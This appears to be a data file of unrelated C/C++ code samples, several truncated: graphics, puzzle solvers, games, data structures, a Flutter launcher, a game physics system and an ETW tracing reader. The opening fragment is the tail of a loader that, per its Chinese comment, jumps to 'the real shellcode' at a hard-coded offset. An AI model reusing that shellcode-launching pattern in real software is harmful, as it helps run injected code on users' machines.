\u8df3\u8f6c\u81f3\u771f\u6b63\u7684shellcode\n\t\t\tDWORD result = ((int(*)(_DWORD))(dwExeBase + RunAddr))(dwExeBase);\n\t\t\tif (result) {\n\t\t\t\t((void(*)(_DWORD))(dwExeBase + 0x88ff7))(dwExeBase);\n\t\t\t}\n\t\t\telse {\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n/*\n\t\u7a0b\u5e8f\u5165\u53e3\uff0c\u65e0\u4efb\u4f55\u4f5c\u7528\n*/\nvoid Main() {\n\n}",
    "#include \"ofApp.h\"\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(39);\r\n\tofSetLineWidth(2);\r\n\tofEnableDepthTest();\r\n\r\n\tauto ico_sphere = ofIcoSpherePrimitive(200, 4);\r\n\tthis->triangle_list.insert(this->triangle_list.end(), ico_sphere.getMesh().getUniqueFaces().begin(), ico_sphere.getMesh().getUniqueFaces().end());\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() {\r\n\r\n\tofSeedRandom(39);\r\n\r\n\tthis->mesh.clear();\r\n\tthis->frame.clear();\r\n\r\n\tfor (int i = 0; i < this->triangle_list.size(); i++) {\r\n\r\n\t\tglm::vec3 avg = (this->triangle_list[i].getVertex(0) + this->triangle_list[i].getVertex(1) + this->triangle_list[i].getVertex(2)) / 3;\r\n\t\tauto noise_value = ofNoise(avg.y * 0.01, avg.x * 0.01, avg.z * 0.01, ofGetFrameNum() * 0.01);\r\n\r\n\t\tif (noise_value < 0.4 || noise_value > 0.6) { continue; }\r\n\r\n\t\tvector<glm::vec3> vertices;\r\n\r\n\t\tvertices.push_back(this->triangle_list[i].getVertex(0));\r\n\t\tvertices.push_back(this->triangle_list[i].getVertex(1));\r\n\t\tvertices.push_back(this->triangle_list[i].getVertex(2));\r\n\r\n\t\tthis->mesh.addVertices(vertices);\r\n\t\tthis->frame.addVertices(vertices);\r\n\r\n\t\tofColor color;\r\n\t\tcolor.setHsb((int)(ofMap(ofNoise(glm::vec3(avg * 0.01)), 0, 1, ofGetFrameNum() * 2, (ofGetFrameNum() * 2) + 92)) % 255, 130, 255);\r\n\r\n\t\tfor (int k = 0; k < vertices.size(); k++) {\r\n\r\n\t\t\tthis->mesh.addColor(ofColor(color, 32));\r\n\t\t\tthis->frame.addColor(color);\r\n\t\t}\r\n\r\n\t\tthis->mesh.addTriangle(this->mesh.getNumVertices() - 1, this->mesh.getNumVertices() - 2, this->mesh.getNumVertices() - 3);\r\n\t\tthis->frame.addTriangle(this->frame.getNumVertices() - 1, this->frame.getNumVertices() - 2, this->frame.getNumVertices() - 3);\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tthis->cam.begin();\r\n\tofRotateY(ofGetFrameNum() * 0.35);\r\n\r\n\tthis->mesh.draw();\r\n\tthis->frame.drawWireframe();\t\r\n\r\n\tthis->cam.end();\r\n\r\n\t/*\r\n\tint start = 150;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "class Solution {\npublic:\n\n    bool isValid(vector<vector<char>>& board,int row,int col,char ch){\n        for(int i=0;i<9;i++){\n            if(board[i][col]==ch) return false;\n            if(board[row][i]==ch) return false;\n            if(board[3*(row/3)+i/3][3*(col/3)+i%3]==ch) return false;\n        }\n        return true;\n    }\n\n\n    bool solve(vector<vector<char>>& board) {\n        for(int i=0;i<9;i++){       // traversing the matrix rows\n            for(int j=0;j<9;j++){   // traversing the matric columns\n                if(board[i][j]=='.'){ // checking for empty cells\n                    for(char ch='1';ch<='9';ch++){ // inserting every element from 1-9 in the cell.\n                        if(isValid(board,i,j,ch)==true){ // checking that the current digit id valid or not.\n                            board[i][j]=ch; // if character is valid, insert it in that empty cell.\n                            if(solve(board)==true) return true; // call for next recursion.\n                            else board[i][j]='.'; // remove character while backtracking.\n                        }\n                    }\n                return false;\n                }\n            }\n        }\n        return true;\n    }\n\n    void solveSudoku(vector<vector<char>>& board) {\n        solve(board);\n    }\n};",
    "#include <iostream>\r\nusing namespace std;\r\nchar x_o[3][3] = { {'1','2','3'},{'4','5','6'},{'7','8','9'} };\r\nchar player = 'x';\r\nvoid drow() {\r\n\tsystem(\"cls\");\r\n\tfor (int i = 0; i < 3; i++)\r\n\t{\r\n\t\tfor (int j = 0; j < 3; j++) {\r\n\r\n\t\t\tcout << \"| \" << x_o[i][j] << \" |\";\r\n\t\t}\r\n\t\tcout << \"\\n--------------\\n\";\r\n\t}\r\n}\r\nvoid play() {\r\n\tchar pos;\r\n\tcout << \"Choose Your Position: (\" << player<<\") \";\r\n\tcin >> pos;\r\n\tbool flage = false;\r\n    for (int i = 0; i < 3; i++) {\r\n        for (int j = 0; j < 3; j++) {\r\n            if (x_o[i][j] == pos) {\r\n                x_o[i][j] = player;\r\n                flage = true;\r\n            }\r\n        }\r\n    }\r\n\r\n    if (!flage) {\r\n        cout << \"Invalid move. Try again.\" << endl;\r\n        play();\r\n    }\r\n\tif (player == 'x')\r\n\t\tplayer = 'o';\r\n\telse\r\n\t{\r\n\t\tplayer = 'x';\r\n\t}\r\n}\r\nchar win() {\r\n\tint counter = 0;\r\n\tint Cx = 0, Co = 0;\r\n\tfor (int i = 0; i < 3; i++)\r\n\t{\r\n\t\tfor (int j = 0; j < 3; j++) {\r\n\t\t\tif (x_o[i][j] != 'x' && x_o[i][j] != 'o') counter++;\r\n\t\t\tif (x_o[i][j] == 'x') Cx++;\r\n\t\t\telse if(x_o[i][j] == 'o') Co++;\r\n\t\t\tif (Cx == 3 || Co == 3) {\r\n\t\t\t\treturn Cx > Co ? 'x' : 'o';\r\n\t\t\t}\r\n\t\t}\r\n\t\tCx = 0;\r\n\t\tCo = 0;\r\n\t}\r\n\tfor (int i = 0; i < 3; i++)\r\n\t{\r\n\t\tfor (int j = 0; j < 3; j++) {\r\n\r\n\t\t\tif (x_o[j][i] == 'x') Cx++;\r\n\t\t\telse if (x_o[j][i] == 'o') Co++;\r\n\t\t\tif (Cx == 3 || Co == 3) {\r\n\t\t\t\treturn Cx > Co ? 'x' : 'o';\r\n\t\t\t}\r\n\t\t}\r\n\t\tCx = 0;\r\n\t\tCo = 0;\r\n\t}\r\n\tif (x_o[0][0] == 'x' && x_o[1][1] == 'x' && x_o[2][2] == 'x') return 'x';\r\n\telse if (x_o[0][0] == 'o' && x_o[1][1] == 'o' && x_o[2][2] == 'o') return 'o';\r\n\telse if (x_o[0][2] == 'x' && x_o[1][1] == 'x' && x_o[2][0] == 'x') return 'x';\r\n\telse if (x_o[0][2] == 'x' && x_o[1][1] == 'x' && x_o[2][0] == 'x') return 'x';\r\n\tif (counter == 0) return'e';\r\n\treturn'c';\r\n}\r\nint main()\r\n{\r\n\tchar player ='x';\r\n\twhile (win() == 'c')\r\n\t{\r\n\tdrow();\r\n\tplay();\r\n\t}\r\n\tdrow();\r\n\tif (win() == 'e')\r\n\t\tcout << \"\\n  Tide\\n\" << endl;\r\n\telse\r\n\t\tcout << \"\\n The Winner Is Player: \" << win() << endl;\r\n\r\n\r\n\treturn 0;\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nvoid bubble_sort(vector<int>& prices) {\n    int n = prices.size();\n    for (int i = 0; i < n - 1; ++i) {\n        for (int j = 0; j < n - i - 1; ++j) {\n            if (prices[j] > prices[j + 1]) {\n                int temp = prices[j];\n                prices[j] = prices[j + 1];\n                prices[j + 1] = temp;\n            }\n        }\n    }\n}\n\nlong long calculate_min_cost(const vector<int>& prices, int X) {\n    int N = prices.size();\n    long long total_cost = 0;\n    int i = 0;\n\n    while (i < N) {\n        int end = min(i + X, N);\n        int min_price = prices[i];\n        for (int j = i; j < end; ++j) {\n            if (prices[j] < min_price) {\n                min_price = prices[j];\n            }\n        }\n\n        long long sum = 0;\n        for (int j = i; j < end; ++j) {\n            sum += prices[j];\n        }\n        sum -= min_price / 2;\n        total_cost += sum;\n\n        i = end;\n    }\n\n    return total_cost;\n}\n\nint main() {\n    ios::sync_with_stdio(false);\n    cin.tie(nullptr);\n\n    int N, Q;\n    cin >> N >> Q;\n\n    vector<int> prices(N);\n    for (int i = 0; i < N; ++i) {\n        cin >> prices[i];\n    }\n\n    bubble_sort(prices);\n\n    vector<int> queries(Q);\n    for (int i = 0; i < Q; ++i) {\n        cin >> queries[i];\n    }\n\n    for (int i = 0; i < Q; ++i) {\n        int X = queries[i];\n        long long min_cost = calculate_min_cost(prices, X);\n        cout << min_\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\n#include<vector>\n#include<sstream>\nusing namespace std;\n\n// 0 - up , 1 - left , 2 - down , 3 - right\n\nint way[4][2] = {{-1,0},{0,-1},{1,0},{0,1}};\n\n\nvoid generatepaths(int i , int j,int spi,int spj,int dir,vector<string> &temp,vector<vector<int>> &board,vector<vector<string>> &res){\n    if(i<0 || i>=board.size() || j<0 || j>=board[0].size())return;\n    string s;\n    if(board[i][j]==2){\n        res.push_back(temp);\n        return;\n    }\n    if(board[i][j]==0){ // empty cell moving forward\n        generatepaths(i+way[dir][0],j+way[dir][1],spi,spj,dir,temp,board,res);\n    }else if(board[i][j]==1){ // found soldier\n        // jump over\n        s=\"Jump (\" + string(1,'0'+(j+1)) + \",\" + string(1,'0'+(i+1)) + \")\";\n        temp.push_back(s);\n        generatepaths(i+way[dir][0],j+way[dir][1],spi,spj,dir,temp,board,res); \n        temp.pop_back();\n\n        //soldier killed\n        s=\"Kill (\" + string(1,'0'+(j+1)) + \",\" + string(1,'0'+(i+1)) + \")\" + \" Turn Left\";\n        temp.push_back(s);\n        board[i][j]=0;\n        generatepaths(i+way[(dir+1)%4][0],j+way[(dir+1)%4][1],spi,spj,(dir+1)%4,temp,board,res);\n        board[i][j]=1;\n        temp.pop_back();\n    }\n}\n\n\nint main(){\n\n    //Chessboard -- \n    //0 - Free Cell\n    //1 - soldier\n    //2 - special castle\n    int x,y;\n    int no_of_soldiers;\n    vector<vector<int>> chessboard(9,vector<int> (9));\n    vector<vector<string>> res;\n    vector<string> temp;\n    cout<<\"soldiers : \";\n    cin>>no_of_soldiers;\n    for (int i = 0; i < no_of_soldiers; i++)\n    {\n        cout<<\"Enter coordinates for soldier \"<<i+1<<\" : \";\n        cin>>x>>y;\n        chessboard[y-1][x-1]=1;\n    }\n    cout<<\"Enter coordinates for special castle : \";\n    cin>>x>>y;\n    x--;\n    y--;\n    chessboard[y][x]=2;\n    cout<<endl;\n    \n    generatepaths(y+way[2][0],x+way[2][1],y,x,2,temp,chessboard,res);\n    for(int i = 0;i<res.size();i++){\n        cout<<\"Path \"<<i+1<<\" :\"<<endl;\n        cout<<\"-------\\n-------\"<<endl;\n        cout<<\"Start (\"<<y+1<<\",\"<<x+1<<\")\"<<endl;\n        for(string s:res[i]){\n            cout<<s<<endl;\n        }\n        cout<<\"Arrive (\"<<y+1<<\",\"<<x+1<<\")\"<<endl<<endl;\n    }\n    return 0;\n    \n}\n",
    "#include <windows.h>\n#include <evntrace.h>\n#include <tdh.h>\n#include <iostream>\n#include <vector>\n#include <string>\n#include <iomanip>\n#include <sstream>\n\n#include \"loguru.hpp\"\n#include \"etwreader.h\"\n#include \"cache.h\"\n#include \"config.h\"\n#include \"etwhandler.h\"\n\n#pragma comment(lib, \"tdh.lib\")\n#pragma comment(lib, \"advapi32.lib\")\n\n\n#define NUM_READERS 1 // 7\nstruct Reader Readers[NUM_READERS];\n\n\n// Entry function\nint InitializeEtwReader(std::vector<HANDLE>& threads) {\n    BOOL ret;\n    DWORD status;\n\n    LOG_F(INFO, \"--[ Tracing session name: %ls\", g_config.sessionName.c_str());\n\n    // Initialize readers\n    for (int i = 0; i < NUM_READERS; ++i) {\n        Readers[i].id = i;\n\n        // Allocate memory for the session name\n        std::wstring mySessionName = g_config.sessionName + L\"_\" + std::to_wstring(i);\n        size_t len = mySessionName.length() + 1; // +1 for null terminator\n        wchar_t* sessionName = new wchar_t[len];\n        wcscpy_s(sessionName, len, mySessionName.c_str());\n        Readers[i].SessionName = sessionName;\n\n        // Initialize handles (assuming INVALID_PROCESSTRACE_HANDLE and NULL are valid initial values)\n        Readers[i].SessionHandle = NULL;\n        Readers[i].TraceHandle = INVALID_PROCESSTRACE_HANDLE;\n    }\n\n    ret = setup_trace(&Readers[0], L\"{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}\", &EventRecordCallbackKernelProcess, L\"Microsoft-Windows-Kernel-Process\");\n    if (!ret) {\n        LOG_F(ERROR, \"TODO ERROR\");\n        return 1;\n    }\n    if (NUM_READERS > 1) {\n        ret = setup_trace(&Readers[1], L\"{0a002690-3839-4e3a-b3b6-96d8df868d99}\", &EventRecordCallbackAntimalwareEngine, L\"Microsoft-Antimalware-Engine\");\n        if (!ret) {\n            LOG_F(ERROR, \"TODO ERROR\");\n            return 1;\n        }\n    }\n    if (NUM_READERS > 2) {\n        ret = setup_trace(&Readers[2], L\"{8E92DEEF-5E17-413B-B927-59B2F06A3CFC}\", &EventRecordCallbackAntimalwareRtp, L\"Microsoft-Antimalware-RTP\");\n        if (!ret) {\n            LOG_F(ERROR, \"TODO ERROR\");\n            return 1;\n        }\n    }\n    if (NUM_READERS > 3) {\n        ret = setup_trace(&Readers[3], L\"{CFEB0608-330E-4410-B00D-56D8DA9986E6}\", &EventRecordCallbackPrintAll, L\"Microsoft-Antimalware-AMFilter\");\n        if (!ret) {\n            LOG_F(ERROR, \"TODO ERROR\");\n            return 1;\n        }\n    }\n    if (NUM_READERS > 4) {\n        ret = setup_trace(&Readers[4], L\"{2A576B87-09A7-520E-C21A-4942F0271D67}\", &EventRecordCallbackPrintAll, L\"Microsoft-Antimalware-Scan-Interface\");\n        if (!ret) {\n            LOG_F(ERROR, \"TODO ERROR\");\n            return 1;\n        }\n    }\n    if (NUM_READERS > 5) {\n        ret = setup_trace(&Readers[5], L\"{e4b70372-261f-4c54-8fa6-a5a7914d73da}\", &EventRecordCallbackPrintAll, L\"Microsoft-Antimalware-Protection\");\n        if (!ret) {\n            LOG_F(ERROR, \"TODO ERROR\");\n            return 1;\n        }\n    }\n    if (NUM_READERS > 6) {\n        ret = setup_trace_security_auditing(&Readers[6]);\n        if (!ret) {\n            LOG_F(ERROR, \"TODO ERROR\");\n            return 1;\n        }\n    }\n    // Test\n    /*ret = setup_trace(&Readers[2], L\"{EDD08927-9CC4-4E65-B970-C2560FB5C289}\", &EventRecordCallbackAntimalwareEngine, L\"Microsoft-Windows-Kernel-File\");\n    if (!ret) {\n        LOG_F(ERROR, \"TODO ERROR\");\n        return 1;\n    }*/\n\n    // ProcessTrace() can only handle 1 (one) real-time processing session\n    // Create threads instead fuck...\n    LOG_F(INFO, \"---[ Start tracing...\");\n    for (size_t i = 0; i < NUM_READERS; ++i) {\n        Reader* reader = &Readers[i];\n\n        HANDLE thread = CreateThread(NULL, 0, TraceProcessingThread, reader, 0, NULL);\n        if (thread == NULL) {\n            LOG_F(ERROR, \"Failed to create thread for trace session %i\", i);\n            return 1;\n        }\n        threads.push_back(thread);\n    }\n\n    LOG_F(INFO, \"---[ All threads created\");\n\n    return 0;\n}\n\n\nvoid EtwReaderStopAll() {\n    /*\n    The ProcessTrace function blocks the thread until\n      it delivers all events,\n      the BufferCallback function returns FALSE,\n      or you call CloseTrace.\n    In addition, if the consumer is consuming events in real time, the ProcessTrace\n    function returns after the controller stops the trace session.\n    (Note that there may be a delay of several seconds before the function returns.)\n    */\n    LOG_F(INFO, \"--[ Stopping EtwTracing\"); fflush(stdout);\n    ULONG status;\n    EVENT_TRACE_PROPERTIES* sessionProperties;\n\n    // Stop trace sessions\n    for (int n = 0; n < NUM_READERS; n++) {\n        Reader* reader = &Readers[n];\n        if (reader == NULL) {\n            continue;\n        }\n        sessionProperties = make_SessionProperties(wcslen(reader->SessionName));\n\n        if (reader->SessionHandle != NULL) {\n            LOG_F(INFO, \"  Stop Session with ControlTrace(EVENT_TRACE_CONTROL_STOP): %d\", n);\n            status = ControlTrace(reader->SessionHandle, reader->SessionName, sessionProperties, EVENT_TRACE_CONTROL_STOP);\n            if (status != ERROR_SUCCESS) {\n   ",
    "#include \"include/Utility.hpp\"\n#include \"include/SearchAlgorithms.hpp\"\n\nvoid measurePerformance(const Maze& maze) {\n    // BFS\n    auto start = std::chrono::high_resolution_clock::now();\n    auto bfs_path = SearchAlgorithms::BFS(maze);\n    auto end = std::chrono::high_resolution_clock::now();\n    auto bfs_duration = std::chrono::duration<double, std::milli>(end - start);\n    std::cout << \"\\nBFS Path:\\n\";\n    maze.printPath(bfs_path);\n    std::cout << \"\\nBFS Execution Time: \" << bfs_duration.count() << \" ms\\n\";\n    std::cout << \"BFS Memory Usage: \" << sizeof(bfs_path) + (bfs_path.capacity() * sizeof(std::pair<int, int>)) << \" bytes\\n\";\n    std::cout << \"BFS Path Length: \" << bfs_path.size() << \"\\n\";\n    std::cout << \"BFS Completeness: \" << (bfs_path.empty() ? \"No\" : \"Yes\") << \"\\n\";\n    std::cout << \"BFS Optimality: \" << (bfs_path.size() - 1) << \"\\n\\n\"; \n\n    // DFS\n    start = std::chrono::high_resolution_clock::now();\n    auto dfs_path = SearchAlgorithms::DFS(maze);\n    end = std::chrono::high_resolution_clock::now();\n    auto dfs_duration = std::chrono::duration<double, std::milli>(end - start);\n    std::cout << \"\\nDFS Path:\\n\";\n    maze.printPath(dfs_path);\n    std::cout << \"\\nDFS Execution Time: \" << dfs_duration.count() << \" ms\\n\";\n    std::cout << \"DFS Memory Usage: \" << sizeof(dfs_path) + (dfs_path.capacity() * sizeof(std::pair<int, int>)) << \" bytes\\n\";\n    std::cout << \"DFS Path Length: \" << dfs_path.size() << \"\\n\";\n    std::cout << \"DFS Completeness: \" << (dfs_path.empty() ? \"No\" : \"Yes\") << \"\\n\";\n    std::cout << \"DFS Optimality: \" << (dfs_path.size() - 1) << \"\\n\\n\"; \n\n    // A*\n    start = std::chrono::high_resolution_clock::now();\n    auto astar_path = SearchAlgorithms::AStar(maze);\n    end = std::chrono::high_resolution_clock::now();\n    auto astar_duration = std::chrono::duration<double, std::milli>(end - start);\n    std::cout << \"\\nA* Path:\\n\";\n    maze.printPath(astar_path);\n    std::cout << \"\\nA* Execution Time: \" << astar_duration.count() << \" ms\\n\";\n    std::cout << \"A* Memory Usage: \" << sizeof(astar_path) + (astar_path.capacity() * sizeof(std::pair<int, int>)) << \" bytes\\n\";\n    std::cout << \"A* Path Length: \" << astar_path.size() << \"\\n\";\n    std::cout << \"A* Completeness: \" << (astar_path.empty() ? \"No\" : \"Yes\") << \"\\n\";\n    std::cout << \"A* Optimality: \" << (astar_path.size() - 1) << \"\\n\\n\";\n\n    // GBFS\n    start = std::chrono::high_resolution_clock::now();\n    auto greedy_path = SearchAlgorithms::GreedyBestFirstSearch(maze);\n    end = std::chrono::high_resolution_clock::now();\n    auto greedy_duration = std::chrono::duration<double, std::milli>(end - start);\n    std::cout << \"\\nGreedy Best-First Search Path:\\n\";\n    maze.printPath(greedy_path);\n    std::cout << \"\\nGBFS Execution Time: \" << greedy_duration.count() << \" ms\\n\";\n    std::cout << \"GBFS Memory Usage: \" << sizeof(greedy_path) + (greedy_path.capacity() * sizeof(std::pair<int, int>)) << \" bytes\\n\";\n    std::cout << \"GBFS Path Length: \" << greedy_path.size() << \"\\n\";\n    std::cout << \"GBFS Completeness: \" << (greedy_path.empty() ? \"No\" : \"Yes\") << \"\\n\";\n    std::cout << \"GBFS Optimality: \" << (greedy_path.size() - 1) << \"\\n\\n\";\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\ntypedef struct Node\n{\n    struct Node *prev;\n    int data;\n    struct Node *next;\n} Node;\n\nNode *create(Node *head, Node *tail, int n)\n{\n    srand(time(NULL));\n\n    if (n == 0)\n    {\n        head = NULL;\n        return head;\n    }\n\n    for (int i = 0; i < n; i++)\n    {\n        Node *t = (Node *)malloc(sizeof(Node));\n        t->prev = t->next = NULL;\n        t->data = (int)rand() % 10;\n\n        if (head == NULL)\n        {\n            head = tail = t;\n        }\n        else\n        {\n            t->next = tail->next; // store tail's next address to t\n            tail->next = t;       // link tail to t\n            t->prev = tail;       // link t to tail\n            tail = t;             // point tail to t (new last node)\n        }\n    }\n    return head;\n}\n\nvoid display(Node *head)\n{\n    Node *p = head;\n    if (head == NULL)\n    {\n        printf(\"NULL\\n\");\n    }\n    else\n    {\n        printf(\"List: \");\n        while (p != NULL)\n        {\n            // printf(\"Node Address: %u, \", &p);\n            // printf(\"Prev: %u, \", p->prev);\n            // printf(\"Data: %d,  \", p->data);\n            // printf(\"Next: %u  ->  \\n\", p->next);\n\n            printf(\"%d -> \", p->data);\n            p = p->next;\n        }\n        printf(\"NULL\\n\");\n    }\n}\n\nint count(Node *head)\n{\n    Node *p = head;\n    int c = 0;\n\n    if (head == NULL)\n    {\n        return c = 0;\n    }\n    else\n    {\n        while (p != NULL)\n        {\n            c++;\n            p = p->next;\n        }\n    }\n    return c;\n}\n\nNode *insert_begin(Node *head, int x)\n{\n    Node *t = (Node *)malloc(sizeof(Node));\n    t->prev = NULL;\n    t->data = x;\n    t->next = head;\n    head = t;\n\n    return head;\n}\n\nNode *insert_n(Node *head, int x, int index)\n{\n    if (index <= 0 || index > count(head) + 1)\n    {\n        printf(\"Error: Index out of bounds\\n\");\n        return head;\n    }\n    else\n    {\n        Node *t = (Node *)malloc(sizeof(Node));\n        t->data = x;\n        t->prev = t->next = NULL;\n\n        if (index == 1)\n        {\n            // empty list\n            if (head == NULL)\n            {\n                head = t;\n            }\n            else\n            {\n                t->next = head;\n                head->prev = t;\n                head = t;\n            }\n        }\n        else\n        {\n            Node *p = head;\n            for (int i = 1; i < index - 1; i++)\n                p = p->next;\n            // first do linking from t to the nodes\n            t->next = p->next;\n            t->prev = p;\n\n            // if next node to p exists then\n            if (p->next)\n                p->next->prev = t; // Note you have to do this step first to not lose p->next\n            p->next = t;\n        }\n    }\n    return head;\n}\n\nNode *Delete(Node *head, int index)\n{\n    Node *p = head;\n\n    if (index < 1 || index > count(head))\n    {\n        printf(\"Invalid Index Error\\n\");\n        return head;\n    }\n    else\n    {\n        if (index == 1)\n        {\n            // Base case: empty list\n            if (head == NULL)\n            {\n                printf(\"You cannot delete an empty list!!!!\\n\");\n                return head;\n            }\n            else\n            {\n                // delete at first node\n                p = head;\n                head = head->next;\n                printf(\"%d is deleted\\n\", p->data);\n                if (head != NULL) // only if head in not NULL, then (we have already checked this condition, but still double check)\n                    head->prev = NULL;\n                free(p);\n            }\n        }\n        else\n        {\n            // deletion at nth node\n            for (int i = 0; i < index - 1; i++) // move p to nth node\n                p = p->next;\n\n            // link (n-1)th node to (n+1)th node\n            p->prev->next = p->next;\n\n            // if (n+1)th node exists, then link (n+1)th node to (n-1)th node\n            if (p->next != NULL)\n                p->next->prev = p->prev;\n\n            printf(\"%d is deleted\\n\", p->data);\n            free(p);\n        }\n    }\n    return head;\n}\n\nNode *reverse(Node *head)\n{\n    Node *p = head;\n\n    if (head == NULL)\n    {\n        printf(\"Error: You cannot reverse empty list\");\n        return head;\n    }\n    else\n    {\n        while (p != NULL)\n        {\n            Node *temp = p->next;\n            p->next = p->prev;\n            p->prev = temp;\n\n            p = p->prev;\n            if (p != NULL && p->next == NULL)\n                head = p;\n        }\n    }\n    return head;\n}\n\nint main(int argc, char **argv)\n{\n    int n, value, index, key;\n\n    Node *head = NULL;\n    Node *tail = NULL;\n\n    printf(\"Enter no. of elem: \");\n    scanf(\"%d\", &n);\n    head = create(head, tail, n);\n    display(head);\n\n    // insertion at n\n    // printf(\"Enter value and index: \");\n    // scanf(\"%d %d\", &value, &index);\n    // head = insert_n(head, value, index);\n    // display(head);\n\n    // deletion at n\n    // printf(\"Enter index to delete: \");\n    // scanf",
    "#include \"systems/physicsSystem.hpp\"\n\n#include \"components.hpp\"\n#include \"game.hpp\"\n#include \"managers/entityManager.hpp\"\n#include \"scene.hpp\"\n#include \"third_party/Eigen/Core\"\n\n#include <SDL3/SDL.h>\n#include <algorithm>\n#include <cassert>\n#include <format>\n\n#ifdef IMGUI\n#include \"imgui.h\"\n#endif\n\n// The physicsSystem is in charge of the collision and mouvements\nPhysicsSystem::PhysicsSystem(Game* game) : mGame(game) {}\n\nvoid PhysicsSystem::update(Scene* scene, float delta) {\n\tfor (const auto& entity : scene->view<Components::position, Components::velocity>()) {\n\t\tscene->get<Components::position>(entity).pos += scene->get<Components::velocity>(entity).vel * delta;\n\t}\n}\n\nvoid PhysicsSystem::collide(Scene* scene) {\n\t// Get a list of all the entities we need to check\n\tauto entities = std::vector<EntityID>();\n\tscene->view<Components::collision, Components::position>().each(\n\t\t[&entities](const EntityID& entity) { entities.emplace_back(entity); });\n\n\t// Debug editor\n#if defined(IMGUI) && defined(DEBUG)\n\tstatic bool editor = false;\n\tImGui::Begin(\"Main menu\");\n\tImGui::Checkbox(\"Collision box editor\", &editor);\n\tImGui::End();\n\n\tif (editor) {\n\t\tscene->getSignal(\"collisionEditor\") = true;\n\n\t\tImGui::Begin(\"Collision editor\");\n\n\t\tfor (const auto& entity : entities) {\n\t\t\tif (ImGui::TreeNode(std::format(\"Entity {}\", entity).data())) {\n\t\t\t\tImGui::SliderFloat2(std::format(\"Position for entity {}\", entity).data(),\n\t\t\t\t\t\t    scene->get<Components::position>(entity).pos.data(), 0.0f,\n\t\t\t\t\t\t    std::max(mGame->getDemensions().x(), mGame->getDemensions().y()));\n\n\t\t\t\tImGui::SliderFloat2(std::format(\"Offset for entity {}\", entity).data(),\n\t\t\t\t\t\t    scene->get<Components::collision>(entity).offset.data(), -500,\n\t\t\t\t\t\t    +500);\n\n\t\t\t\tImGui::SliderFloat2(std::format(\"Size for entity {}\", entity).data(),\n\t\t\t\t\t\t    scene->get<Components::collision>(entity).size.data(), 0.0f,\n\t\t\t\t\t\t    std::max(mGame->getDemensions().x(), mGame->getDemensions().y()));\n\n\t\t\t\tImGui::TreePop();\n\t\t\t}\n\t\t\t// TODO: editor\n\t\t}\n\n\t\tImGui::End();\n\t}\n#endif\n\n\t// Iterate over all pairs of colliders\n\t// PERF: Use some nice trees https://gamedev.stackexchange.com/questions/26501/how-does-a-collision-engine-work\n\tfor (size_t i = 0; i < entities.size(); ++i) {\n\t\tfor (size_t j = i + 1; j < entities.size(); ++j) {\n\t\t\tif (AABBxAABB(scene, entities[i], entities[j])) {\n\t\t\t\tpushBack(scene, entities[i], entities[j]);\n\t\t\t}\n\t\t}\n\t}\n\n\treturn;\n}\n\nbool PhysicsSystem::AABBxAABB(const Scene* scene, const EntityID a, const EntityID b) const {\n\tassert(a != b && \"Hey! Why are the same objects colliding into each other\");\n\n\tconst Eigen::Vector2f& leftA =\n\t\tscene->get<Components::position>(a).pos + scene->get<Components::collision>(a).offset;\n\tconst Eigen::Vector2f& rightA = leftA + scene->get<Components::collision>(a).size;\n\n\tconst Eigen::Vector2f& leftB =\n\t\tscene->get<Components::position>(b).pos + scene->get<Components::collision>(b).offset;\n\tconst Eigen::Vector2f& rightB = leftB + scene->get<Components::collision>(b).size;\n\n\tassert(!std::isnan(leftA.x()) && !std::isinf(leftA.x()));\n\tassert(!std::isnan(rightA.x()) && !std::isinf(rightA.x()));\n\tassert(!std::isnan(leftB.x()) && !std::isinf(leftB.x()));\n\tassert(!std::isnan(rightB.x()) && !std::isinf(rightB.x()));\n\tassert(!std::isnan(leftA.y()) && !std::isinf(leftA.y()));\n\tassert(!std::isnan(rightA.y()) && !std::isinf(rightA.y()));\n\tassert(!std::isnan(leftB.y()) && !std::isinf(leftB.y()));\n\tassert(!std::isnan(rightB.y()) && !std::isinf(rightB.y()));\n\n\t// If one of these four are true, it means the cubes are not intersecting\n\tconst bool notIntercecting = 